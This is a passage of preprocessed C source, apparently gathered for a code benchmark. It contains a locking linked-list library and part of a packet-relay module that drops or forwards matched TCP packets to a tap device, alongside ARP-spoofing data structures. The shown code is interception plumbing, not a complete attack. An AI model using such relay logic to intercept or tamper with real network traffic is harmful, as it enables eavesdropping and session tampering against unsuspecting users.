      }
    }
  }
#line 36
  return;
}
}
#line 38 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void __unlock___1(struct list *l ) 
{ 
  pthread_t tmp ;

  {
#line 41
  if (! l->l_locked) {
    {
#line 42
    pthread_mutex_unlock(& l->l_mutex);
    }
  } else {
    {
#line 41
    tmp = pthread_self();
    }
#line 41
    if (l->l_locked_thr != tmp) {
      {
#line 42
      pthread_mutex_unlock(& l->l_mutex);
      }
    }
  }
#line 44
  return;
}
}
#line 46 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_flush(struct list *l ) 
{ 
  struct list_iterator *i ;
  void *tmp ;

  {
  {
#line 50
  __lock___1(l);
#line 51
  tmp = (void *)0;
#line 51
  l->l_last = tmp;
#line 51
  l->l_first = tmp;
#line 52
  i = l->l_iter;
  }
  {
#line 52
  while (1) {
    while_continue: /* CIL Label */ ;
#line 52
    if (! i) {
#line 52
      goto while_break;
    }
#line 53
    i->i_cur = (void *)0;
#line 52
    i = i->i_next;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 55
  __unlock___1(l);
  }
#line 56
  return;
}
}
#line 58 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void __update_iterators(struct list *l , void *old_item , void *new_item ) 
{ 
  struct list_iterator *i ;

  {
#line 62
  i = l->l_iter;
  {
#line 62
  while (1) {
    while_continue: /* CIL Label */ ;
#line 62
    if (! i) {
#line 62
      goto while_break;
    }
#line 63
    if ((unsigned long )i->i_cur == (unsigned long )old_item) {
#line 64
      i->i_cur = new_item;
    }
#line 62
    i = i->i_next;
  }
  while_break: /* CIL Label */ ;
  }
#line 66
  return;
}
}
#line 68 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_push(struct list *l , void *m ) 
{ 
  void *tmp ;

  {
  {
#line 70
  __lock___1(l);
#line 71
  tmp = l->l_first;
#line 71
  *((void **)((char *)m + l->l_off)) = tmp;
  }
#line 71
  if (! tmp) {
#line 72
    l->l_last = m;
  }
  {
#line 73
  __update_iterators(l, l->l_first, m);
#line 74
  l->l_first = m;
#line 75
  __unlock___1(l);
  }
#line 76
  return;
}
}
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void __enqueue(struct list *l , void *m ) 
{ 


  {
#line 80
  *((void **)((char *)m + l->l_off)) = (void *)0;
#line 81
  if (l->l_last) {
#line 82
    *((void **)((char *)l->l_last + l->l_off)) = m;
  } else {
#line 84
    l->l_first = m;
  }
#line 85
  l->l_last = m;
#line 86
  return;
}
}
#line 88 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_insert_at(struct list *l , int nr , void *m ) 
{ 
  void **p ;
  int tmp ;

  {
  {
#line 92
  __lock___1(l);
#line 93
  p = & l->l_first;
  }
  {
#line 94
  while (1) {
    while_continue: /* CIL Label */ ;
#line 94
    if (*p) {
#line 94
      tmp = nr;
#line 94
      nr --;
#line 94
      if (! tmp) {
#line 94
        goto while_break;
      }
    } else {
#line 94
      goto while_break;
    }
#line 95
    p = (void **)((char *)*p + l->l_off);
  }
  while_break: /* CIL Label */ ;
  }
#line 97
  *((void **)((char *)m + l->l_off)) = *p;
#line 98
  if (*p) {
#line 99
    *p = m;
  } else {
    {
#line 101
    __enqueue(l, m);
    }
  }
  {
#line 102
  __update_iterators(l, *((void **)((char *)m + l->l_off)), m);
#line 103
  __unlock___1(l);
  }
#line 104
  return;
}
}
#line 106 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_enqueue(struct list *l , void *m ) 
{ 


  {
  {
#line 108
  __lock___1(l);
#line 109
  __enqueue(l, m);
#line 110
  __unlock___1(l);
  }
#line 111
  return;
}
}
#line 113 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_produce(struct list *l , void *m ) 
{ 


  {
  {
#line 115
  __lock___1(l);
#line 116
  __enqueue(l, m);
#line 118
  pthread_cond_signal(& l->l_notempty);
#line 120
  __unlock___1(l);
  }
#line 121
  return;
}
}
#line 123 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_produce_start(struct list *l ) 
{ 


  {
  {
#line 125
  __lock___1(l);
#line 126
  l->l_produce_done = 0;
#line 127
  __unlock___1(l);
  }
#line 128
  return;
}
}
#line 130 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_produce_done(struct list *l ) 
{ 


  {
  {
#line 132
  __lock___1(l);
#line 133
  l->l_produce_done = 1;
#line 135
  pthread_cond_signal(& l->l_notempty);
#line 137
  __unlock___1(l);
  }
#line 138
  return;
}
}
#line 140 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void *__pop(struct list *l ) 
{ 
  void *retval ;
  void *tmp ;

  {
#line 144
  retval = l->l_first;
#line 144
  if (retval) {
#line 145
    tmp = *((void **)((char *)retval + l->l_off));
#line 145
    l->l_first = tmp;
#line 145
    if (! tmp) {
#line 146
      l->l_last = (void *)0;
    }
    {
#line 147
    __update_iterators(l, retval, l->l_first);
    }
  }
#line 149
  return (retval);
}
}
#line 152 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_pop(struct list *l ) 
{ 
  void *retval ;

  {
  {
#line 156
  __lock___1(l);
#line 157
  retval = __pop(l);
#line 158
  __unlock___1(l);
  }
#line 159
  return (retval);
}
}
#line 162 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
static void *__list_consume(struct list *l , struct timespec  const  *absts ) 
{ 
  void *retval ;
  int ret ;
  struct timespec ts ;

  {
  {
#line 168
  __lock___1(l);
  }
  {
#line 170
  while (1) {
    while_continue: /* CIL Label */ ;
#line 170
    if (! l->l_first) {
#line 170
      if (! (! l->l_produce_done)) {
#line 170
        goto while_break;
      }
    } else {
#line 170
      goto while_break;
    }
#line 171
    if (absts) {
      {
#line 172
      ret = pthread_cond_timedwait((pthread_cond_t */* __restrict  */)(& l->l_notempty),
                                   (pthread_mutex_t */* __restrict  */)(& l->l_mutex),
                                   (struct timespec  const  */* __restrict  */)absts);
      }
#line 172
      if (ret == 110) {
#line 174
        goto while_break;
      } else
#line 172
      if (ret == 4) {
#line 174
        goto while_break;
      }
    } else {
      {
#line 182
      ts.tv_sec = (__time_t )2000000000;
#line 183
      ts.tv_nsec = (__syscall_slong_t )0;
#line 184
      ret = pthread_cond_timedwait((pthread_cond_t */* __restrict  */)(& l->l_notempty),
                                   (pthread_mutex_t */* __restrict  */)(& l->l_mutex),
                                   (struct timespec  const  */* __restrict  */)(& ts));
      }
#line 186
      if (ret == 110) {
#line 187
        goto while_break;
      } else
#line 186
      if (ret == 4) {
#line 187
        goto while_break;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 191
  retval = __pop(l);
#line 192
  __unlock___1(l);
  }
#line 193
  return (retval);
}
}
#line 196 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_consume(struct list *l , struct timespec  const  *absts ) 
{ 
  void *tmp ;

  {
  {
#line 198
  tmp = __list_consume(l, absts);
  }
#line 198
  return (tmp);
}
}
#line 201 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_consume_rel(struct list *l , struct timespec  const  *relts ) 
{ 
  struct timeval now ;
  struct timespec absts ;
  void *tmp ;

  {
  {
#line 206
  gettimeofday((struct timeval */* __restrict  */)(& now), (__timezone_ptr_t )((void *)0));
#line 207
  absts.tv_sec = now.tv_sec + (__time_t )relts->tv_sec;
#line 208
  absts.tv_nsec = now.tv_usec * 1000L + (__suseconds_t )relts->tv_nsec;
  }
#line 209
  if (absts.tv_nsec >= 1000000000L) {
#line 210
    absts.tv_nsec -= 1000000000L;
#line 211
    (absts.tv_sec) ++;
  }
  {
#line 213
  tmp = __list_consume(l, (struct timespec  const  *)(& absts));
  }
#line 213
  return (tmp);
}
}
#line 216 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_peek(struct list *l ) 
{ 
  void *retval ;

  {
  {
#line 220
  __lock___1(l);
#line 221
  retval = l->l_first;
#line 222
  __unlock___1(l);
  }
#line 223
  return (retval);
}
}
#line 226 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_at(struct list *l , int nr ) 
{ 
  void *retval ;
  void *p ;
  int i ;

  {
  {
#line 231
  __lock___1(l);
#line 232
  p = l->l_first;
#line 232
  i = 0;
  }
  {
#line 232
  while (1) {
    while_continue: /* CIL Label */ ;
#line 232
    if (p) {
#line 232
      if (! (i < nr)) {
#line 232
        goto while_break;
      }
    } else {
#line 232
      goto while_break;
    }
#line 232
    p = *((void **)((char *)p + l->l_off));
#line 232
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 234
  if (p) {
#line 235
    retval = p;
  } else {
#line 237
    retval = (void *)0;
  }
  {
#line 238
  __unlock___1(l);
  }
#line 239
  return (retval);
}
}
#line 242 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static int __func_remove(int nr , void *p , void *m ) 
{ 


  {
#line 244
  if ((unsigned long )p == (unsigned long )m) {
#line 245
    return (1);
  } else {
#line 247
    return (0);
  }
}
}
#line 250 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static int __func_remove_at(int nr , void *p , void *m ) 
{ 


  {
#line 252
  if (nr == (int )m) {
#line 253
    return (1);
  } else {
#line 255
    return (0);
  }
}
}
#line 258 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
__inline static void *__list_remove(struct list *l , int (*func)(int nr , void * ,
                                                                 void *m ) , void *m ) 
{ 
  void *retval ;
  void **p ;
  int nr ;
  void *tmp ;
  int tmp___0 ;

  {
  {
#line 265
  nr = 0;
#line 266
  __lock___1(l);
#line 267
  p = & l->l_first;
  }
  {
#line 268
  while (1) {
    while_continue: /* CIL Label */ ;
#line 268
    if (! *p) {
#line 268
      goto while_break;
    }
    {
#line 269
    tmp___0 = (*func)(nr, *p, m);
    }
#line 269
    if (tmp___0) {
#line 270
      retval = *p;
#line 273
      tmp = *((void **)((char *)*p + l->l_off));
#line 273
      *p = tmp;
#line 273
      if (! tmp) {
#line 274
        if (! l->l_first) {
#line 275
          l->l_last = (void *)0;
        } else {
#line 277
          l->l_last = (void *)((char *)p - l->l_off);
        }
      }
      {
#line 279
      __update_iterators(l, retval, *p);
#line 280
      __unlock___1(l);
      }
#line 281
      return (retval);
    }
#line 283
    p = (void **)((char *)*p + l->l_off);
#line 284
    nr ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 286
  __unlock___1(l);
  }
#line 287
  return (*p);
}
}
#line 290 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_remove(struct list *l , void *m ) 
{ 
  void *tmp ;

  {
  {
#line 292
  tmp = __list_remove(l, & __func_remove, m);
  }
#line 292
  return (tmp);
}
}
#line 295 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_remove_at(struct list *l , int nr ) 
{ 
  void *tmp ;

  {
  {
#line 297
  tmp = __list_remove(l, & __func_remove_at, (void *)nr);
  }
#line 297
  return (tmp);
}
}
#line 300 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_remove_func(struct list *l , int (*func)(int nr , void * , void *m ) ,
                       void *m ) 
{ 
  void *tmp ;

  {
  {
#line 303
  tmp = __list_remove(l, func, m);
  }
#line 303
  return (tmp);
}
}
#line 306 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
int list_count(struct list *l ) 
{ 
  int i ;
  void *p ;

  {
  {
#line 311
  __lock___1(l);
#line 312
  i = 0;
#line 312
  p = l->l_first;
  }
  {
#line 312
  while (1) {
    while_continue: /* CIL Label */ ;
#line 312
    if (! p) {
#line 312
      goto while_break;
    }
#line 312
    i ++;
#line 312
    p = *((void **)((char *)p + l->l_off));
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 313
  __unlock___1(l);
  }
#line 314
  return (i);
}
}
#line 317 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_lock(struct list *l ) 
{ 
  pthread_t tmp ;

  {
#line 320
  if (! l->l_locked) {
    {
#line 321
    pthread_mutex_lock(& l->l_mutex);
#line 322
    l->l_locked_thr = pthread_self();
#line 323
    l->l_locked = 1;
    }
  } else {
    {
#line 320
    tmp = pthread_self();
    }
#line 320
    if (l->l_locked_thr != tmp) {
      {
#line 321
      pthread_mutex_lock(& l->l_mutex);
#line 322
      l->l_locked_thr = pthread_self();
#line 323
      l->l_locked = 1;
      }
    } else {
#line 325
      (l->l_locked) ++;
    }
  }
#line 327
  return;
}
}
#line 329 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_unlock(struct list *l ) 
{ 


  {
#line 332
  (l->l_locked) --;
#line 332
  if (l->l_locked == 0) {
    {
#line 333
    pthread_mutex_unlock(& l->l_mutex);
    }
  }
#line 335
  return;
}
}
#line 340 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_iter_set(struct list_iterator *i , struct list *l ) 
{ 


  {
  {
#line 342
  __lock___1(l);
#line 343
  i->i_list = l;
#line 344
  i->i_cur = l->l_first;
#line 345
  i->i_next = l->l_iter;
#line 346
  l->l_iter = i;
#line 347
  __unlock___1(l);
  }
#line 348
  return;
}
}
#line 350 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void list_iter_end(struct list_iterator *i ) 
{ 
  struct list_iterator **p ;
  struct list *l ;

  {
  {
#line 355
  l = i->i_list;
#line 356
  __lock___1(l);
#line 357
  p = & l->l_iter;
  }
  {
#line 358
  while (1) {
    while_continue: /* CIL Label */ ;
#line 358
    if (! *p) {
#line 358
      goto while_break;
    }
#line 359
    if ((unsigned long )*p == (unsigned long )i) {
#line 360
      *p = i->i_next;
#line 361
      goto while_break;
    }
#line 363
    p = & (*p)->i_next;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 365
  __unlock___1(l);
#line 366
  i->i_cur = (void *)0;
#line 367
  i->i_next = (struct list_iterator *)((void *)0);
#line 368
  i->i_list = (struct list *)((void *)0);
  }
#line 369
  return;
}
}
#line 371 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.c"
void *list_iter_get(struct list_iterator *i ) 
{ 
  void *retval ;
  struct list *l ;

  {
  {
#line 376
  l = i->i_list;
#line 377
  __lock___1(l);
#line 378
  retval = i->i_cur;
  }
#line 379
  if (retval) {
#line 380
    i->i_cur = *((void **)((char *)retval + l->l_off));
  }
  {
#line 381
  __unlock___1(l);
  }
#line 382
  return (retval);
}
}
#line 137 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2), __leaf__)) strcat)(char * __restrict  __dest ,
                                                                                                 char const   * __restrict  __src ) ;
#line 144
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,2), __leaf__)) strcmp)(char const   *__s1 ,
                                                                                               char const   *__s2 )  __attribute__((__pure__)) ;
#line 176
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1), __leaf__)) strdup)(char const   *__s )  __attribute__((__malloc__)) ;
#line 146 "/usr/include/fcntl.h"
extern int ( __attribute__((__nonnull__(1))) open)(char const   *__file , int __oflag 
                                                   , ...) ;
#line 53 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static struct list l_relay_db  = 
#line 53 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct relay_item *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 55 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void ri_want(struct relay_item *ri ) 
{ 


  {
  {
#line 57
  pthread_mutex_lock(& ri->mutex);
#line 58
  (ri->lock_count) ++;
#line 59
  pthread_mutex_unlock(& ri->mutex);
  }
#line 60
  return;
}
}
#line 62 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void ri_release(struct relay_item *ri ) 
{ 


  {
  {
#line 64
  pthread_mutex_lock(& ri->mutex);
#line 65
  (ri->lock_count) --;
  }
#line 65
  if (ri->lock_count == 0) {
    {
#line 66
    pthread_cond_broadcast(& ri->lock_cond);
    }
  }
  {
#line 67
  pthread_mutex_unlock(& ri->mutex);
  }
#line 68
  return;
}
}
#line 70 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void ri_wait_for_release(struct relay_item *ri ) 
{ 


  {
  {
#line 72
  pthread_mutex_lock(& ri->mutex);
  }
  {
#line 73
  while (1) {
    while_continue: /* CIL Label */ ;
#line 73
    if (! (ri->lock_count > 0)) {
#line 73
      goto while_break;
    }
    {
#line 74
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& ri->lock_cond), (pthread_mutex_t */* __restrict  */)(& ri->mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 75
  pthread_mutex_unlock(& ri->mutex);
  }
#line 76
  return;
}
}
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static struct relay_item *ri_allocate(void) 
{ 
  struct relay_item *ri ;
  void *tmp ;

  {
  {
#line 82
  tmp = malloc(sizeof(struct relay_item ));
#line 82
  ri = (struct relay_item *)tmp;
  }
#line 83
  if (! ri) {
    {
#line 83
    __assert_fail("ri", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c",
                  83U, "ri_allocate");
    }
  }
  {
#line 84
  memset((void *)ri, 0, sizeof(struct relay_item ));
#line 85
  pthread_mutex_init(& ri->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 86
  pthread_cond_init((pthread_cond_t */* __restrict  */)(& ri->lock_cond), (pthread_condattr_t const   */* __restrict  */)((void *)0));
#line 87
  ri->ethtap_fd = -1;
  }
#line 88
  return (ri);
}
}
#line 91 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void ri_free(struct relay_item *ri ) 
{ 


  {
  {
#line 93
  ri_wait_for_release(ri);
#line 94
  pthread_cond_destroy(& ri->lock_cond);
#line 95
  pthread_mutex_destroy(& ri->mutex);
  }
#line 96
  if (ri->ethtap_fd >= 0) {
    {
#line 97
    close(ri->ethtap_fd);
    }
  }
#line 98
  if (ri->ethtap_name) {
    {
#line 99
    free((void *)ri->ethtap_name);
    }
  }
  {
#line 100
  free((void *)ri);
  }
#line 101
  return;
}
}
#line 105 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
__inline static int packet_match_relay_item(struct packet *p , struct relay_item *ri ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int tmp ;
  int tmp___0 ;

  {
#line 107
  iph = p->p_iph;
#line 108
  tcph = p->p_hdr.p_tcph;
#line 110
  if ((iph->saddr & ri->src_mask) == (ri->src_addr & ri->src_mask)) {
#line 110
    if ((iph->daddr & ri->dst_mask) == (ri->dst_addr & ri->dst_mask)) {
      {
#line 110
      tmp = port_match((int )tcph->__annonCompField3.__annonCompField2.source, ri->src_ports);
      }
#line 110
      if (tmp) {
        {
#line 110
        tmp___0 = port_match((int )tcph->__annonCompField3.__annonCompField2.dest,
                             ri->dst_ports);
        }
#line 110
        if (tmp___0) {
#line 114
          return (1);
        }
      }
    }
  }
#line 116
  return (0);
}
}
#line 119 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static struct relay_item *packet_match_relay(struct packet *p ) 
{ 
  struct list_iterator li ;
  struct relay_item *ri ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 124
  list_lock(& l_relay_db);
#line 125
  list_iter_set(& li, & l_relay_db);
  }
  {
#line 126
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 126
    tmp___0 = list_iter_get(& li);
#line 126
    ri = (struct relay_item *)tmp___0;
    }
#line 126
    if (! ri) {
#line 126
      goto while_break;
    }
    {
#line 127
    tmp = packet_match_relay_item(p, ri);
    }
#line 127
    if (tmp) {
      {
#line 128
      ri_want(ri);
      }
#line 129
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 132
  list_iter_end(& li);
#line 133
  list_unlock(& l_relay_db);
  }
#line 134
  return (ri);
}
}
#line 142 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
void ethtap_relay(struct packet *p , struct relay_item *ri ) 
{ 
  char buf[4096] ;
  int len ;
  struct ethhdr hdr ;
  uint16_t tmp ;
  char *tmp___0 ;
  uint16_t tmp___1 ;
  char *tmp___2 ;

  {
#line 149
  if (ri->ethtap_fd < 0) {
    {
#line 150
    printf((char const   */* __restrict  */)"ethtap_relay error: ethtap_fd < 0\n");
    }
#line 151
    return;
  }
  {
#line 174
  buf[1] = (char)0;
#line 174
  buf[0] = buf[1];
#line 175
  len = 2;
#line 177
  memset((void *)(& hdr), 0, sizeof(struct ethhdr ));
#line 178
  hdr.h_proto = (p->p_ethh)->h_proto;
#line 179
  memcpy((void */* __restrict  */)(buf + len), (void const   */* __restrict  */)(& hdr),
         sizeof(struct ethhdr ));
#line 180
  len = (int )((unsigned long )len + sizeof(struct ethhdr ));
#line 182
  memcpy((void */* __restrict  */)(buf + len), (void const   */* __restrict  */)(p->p_raw + sizeof(struct ethhdr )),
         (unsigned long )p->p_raw_len - sizeof(struct ethhdr ));
#line 183
  len = (int )((unsigned long )len + ((unsigned long )p->p_raw_len - sizeof(struct ethhdr )));
#line 185
  tmp = ntohs((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest);
#line 185
  tmp___0 = host_lookup((p->p_iph)->daddr, hl_mode);
#line 185
  tmp___1 = ntohs((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source);
#line 185
  tmp___2 = host_lookup((p->p_iph)->saddr, hl_mode);
#line 185
  printf((char const   */* __restrict  */)"relay packet %s:%d to %s:%d\n", tmp___2,
         (int )tmp___1, tmp___0, (int )tmp);
#line 188
  writen(ri->ethtap_fd, buf, len);
  }
#line 190
  return;
}
}
#line 192 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
int process_pktrelay(struct packet *p , struct arp_spoof_info *asi ) 
{ 
  struct relay_item *ri ;
  int retval ;

  {
  {
#line 197
  ri = packet_match_relay(p);
  }
#line 197
  if (! ri) {
#line 198
    return (0);
  }
#line 199
  retval = 0;
#line 200
  if (ri->flags & 1U) {
#line 201
    retval = 1;
  }
#line 203
  if (ri->flags & 2U) {
    {
#line 204
    ethtap_relay(p, ri);
#line 205
    retval = 1;
    }
  }
  {
#line 208
  ri_release(ri);
  }
#line 209
  return (retval);
}
}
#line 217 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void relay_item_print(int i , struct relay_item *ri ) 
{ 
  char buf_src_ports[512] ;
  char buf_dst_ports[512] ;
  char buf[512] ;
  char flags[512] ;
  int tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  char *tmp___2 ;

  {
  {
#line 223
  sprintf_db_ports(ri->src_ports, buf_src_ports, (int )sizeof(buf_src_ports), 1);
#line 224
  sprintf_db_ports(ri->dst_ports, buf_dst_ports, (int )sizeof(buf_dst_ports), 1);
#line 225
  tmp = count_mask(ri->src_mask);
#line 225
  tmp___0 = host_lookup(ri->src_addr, hl_mode);
#line 225
  sprintf((char */* __restrict  */)(buf), (char const   */* __restrict  */)"%s/%d [%s]",
          tmp___0, tmp, buf_src_ports);
  }
  {
#line 228
  if (ri->flags == 1U) {
#line 228
    goto case_1;
  }
#line 231
  if (ri->flags == 2U) {
#line 231
    goto case_2;
  }
#line 227
  goto switch_break;
  case_1: /* CIL Label */ 
  {
#line 229
  sprintf((char */* __restrict  */)(flags), (char const   */* __restrict  */)"DROP");
  }
#line 230
  goto switch_break;
  case_2: /* CIL Label */ 
  {
#line 232
  sprintf((char */* __restrict  */)(flags), (char const   */* __restrict  */)"ETH RELAY to %s",
          ri->ethtap_name);
  }
#line 233
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 235
  tmp___1 = count_mask(ri->dst_mask);
#line 235
  tmp___2 = host_lookup(ri->dst_addr, hl_mode);
#line 235
  printf((char const   */* __restrict  */)"%2d) %-24s --> %s/%d [%s] flags %s\n",
         i, buf, tmp___2, tmp___1, buf_dst_ports, flags);
  }
#line 239
  return;
}
}
#line 241 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void relay_list_items(void) 
{ 
  struct list_iterator li ;
  struct relay_item *ri ;
  int i ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 245
  i = 0;
#line 247
  list_iter_set(& li, & l_relay_db);
  }
  {
#line 248
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 248
    tmp___0 = list_iter_get(& li);
#line 248
    ri = (struct relay_item *)tmp___0;
    }
#line 248
    if (! ri) {
#line 248
      goto while_break;
    }
    {
#line 249
    tmp = i;
#line 249
    i ++;
#line 249
    relay_item_print(tmp, ri);
    }
#line 250
    if (i % lines_o == 0) {
      {
#line 251
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 253
  list_iter_end(& li);
  }
#line 254
  return;
}
}
#line 257 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void relay_add_item(void) 
{ 
  struct relay_item *ri ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  char name_buf[128] ;
  char name_buf2[256] ;
  char ethtap_mac[6] ;
  int flags_c ;
  int nr ;
  int ethtap_fd ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;

  {
  {
#line 268
  ethtap_fd = -1;
#line 269
  tmp = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                        & src_mask, (unsigned int *)(src_ports), 0U,
                                        0U, (int *)((void *)0));
  }
#line 269
  if (tmp < 0) {
#line 271
    return;
  }
  {
#line 272
  tmp___0 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            0U, 0U, (int *)((void *)0));
  }
#line 272
  if (tmp___0 < 0) {
#line 274
    return;
  }
  {
#line 275
  flags_c = menu_choose_char((char *)"flags: [n]one, [d]rop, [e]th_relay", (char *)"nde",
                             (char )'d');
  }
#line 275
  if (flags_c < 0) {
#line 276
    return;
  }
#line 277
  if (flags_c == 101) {
    {
#line 278
    tmp___1 = menu_choose_string((char *)"eth relay device", name_buf, (int )sizeof(name_buf),
                                 (char *)"tap0");
    }
#line 278
    if (tmp___1 < 0) {
#line 280
      return;
    }
    {
#line 281
    strcpy((char */* __restrict  */)(name_buf2), (char const   */* __restrict  */)"/dev/");
#line 282
    strcat((char */* __restrict  */)(name_buf2), (char const   */* __restrict  */)(name_buf));
#line 283
    ethtap_fd = open((char const   *)(name_buf2), 2);
    }
#line 283
    if (ethtap_fd < 0) {
      {
#line 284
      printf((char const   */* __restrict  */)"cannot open %s for read/write\n", name_buf2);
      }
#line 285
      return;
    }
    {
#line 287
    get_ifc_info(name_buf, (unsigned int *)((void *)0), ethtap_mac);
    }
  }
  {
#line 289
  tmp___2 = list_count(& l_relay_db);
#line 289
  tmp___3 = list_count(& l_relay_db);
#line 289
  nr = menu_choose_unr((char *)"insert at", 0, tmp___3, tmp___2);
  }
#line 289
  if (nr == -1) {
#line 290
    return;
  }
  {
#line 291
  ri = ri_allocate();
#line 292
  ri->src_addr = src_ip;
#line 293
  ri->src_mask = src_mask;
#line 294
  port_htons((unsigned int *)(src_ports));
#line 295
  memcpy((void */* __restrict  */)(ri->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 296
  ri->dst_addr = dst_ip;
#line 297
  ri->dst_mask = dst_mask;
#line 298
  port_htons((unsigned int *)(dst_ports));
#line 299
  memcpy((void */* __restrict  */)(ri->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
  }
  {
#line 301
  if (flags_c == 100) {
#line 301
    goto case_100;
  }
#line 304
  if (flags_c == 101) {
#line 304
    goto case_101;
  }
#line 310
  goto switch_default;
  case_100: /* CIL Label */ 
#line 302
  ri->flags = 1U;
#line 303
  goto switch_break;
  case_101: /* CIL Label */ 
  {
#line 305
  ri->flags = 2U;
#line 306
  ri->ethtap_name = strdup((char const   *)(name_buf));
#line 307
  ri->ethtap_fd = ethtap_fd;
#line 308
  memcpy((void */* __restrict  */)(ri->ethtap_mac), (void const   */* __restrict  */)(ethtap_mac),
         (size_t )6);
  }
#line 309
  goto switch_break;
  switch_default: /* CIL Label */ 
#line 311
  ri->flags = 0U;
  switch_break: /* CIL Label */ ;
  }
  {
#line 313
  list_insert_at(& l_relay_db, nr, (void *)ri);
  }
#line 314
  return;
}
}
#line 316 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/pktrelay.c"
static void relay_mod_item(void) 
{ 
  struct relay_item *ri ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  char name_buf[128] ;
  char name_buf2[256] ;
  int nr ;
  char flags_dfl ;
  int flags_c ;
